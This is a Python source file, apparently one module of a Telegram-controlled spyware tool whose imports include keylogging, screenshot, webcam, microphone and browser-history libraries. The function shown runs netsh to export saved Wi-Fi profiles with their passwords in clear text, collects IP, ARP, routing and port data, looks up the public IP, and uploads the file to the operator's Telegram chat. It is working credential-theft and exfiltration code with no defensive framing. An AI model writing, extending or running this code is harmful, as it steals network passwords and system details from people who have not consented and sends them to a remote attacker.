
import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener

import telepot

def get(botObj:telepot.Bot, chat_id, path=os.path.join(".","output","networkinfo.txt")):
    """
    Runs an array of commands to query network information, such as network profiles, passwords, \
    ip configuration, arp table, routing table, tcp/udp ports, and attempt to query the ipify.org \
    API for public IP address. All the output is redirected to the network info output file.

    :param export_path:  The file path where the data to be exported resides.
    :param network_file:  A path to the file where the network information output is stored.
    :return:  Nothing
    """

    if (botObj is not None):
        botObj.sendMessage(chat_id, "Scanning")

    syntax = ['Netsh', 'WLAN', 'export', 'profile', f'folder={str(Path(path).parent)}', 'key=clear',
                '&', 'ipconfig', '/all',
                '&', 'arp', '-a',
                '&', 'getmac', '-V',
                '&', 'route', 'print',
                '&', 'netstat', '-a'
            ]

    try:
        # Open the network information file in write mode and log file in write mode #
        with Path(path).open('w', encoding='utf-8') as network_io:
            try:
                # Setup network info gathering commands child process #
                with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
                    # Execute child process #
                    commands.communicate(timeout=60)

            # If execution timeout occurred #
            except TimeoutExpired:
                pass

            # Get the hostname #
            hostname = socket.gethostname()
            # Get the IP address by hostname #
            ip_addr = socket.gethostbyname(hostname)

            try:
                # Query ipify API to retrieve public IP #
                public_ip = requests.get('https://api.ipify.org').text

            # If error occurs querying public IP #
            except requests.ConnectionError as conn_err:
                public_ip = f'* Ipify connection failed: {conn_err} *'

            # Log the public and private IP address #
            network_io.write(f'[!] Public IP Address: {public_ip}\n'
                             f'[!] Private IP Address: {ip_addr}\n')

    # If error occurs during file operation #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)

    if (botObj is not None):
        with Path(path).open('r', encoding='utf-8') as network_io:
            botObj.sendDocument(chat_id, document=network_io, caption="nwtwork-info")
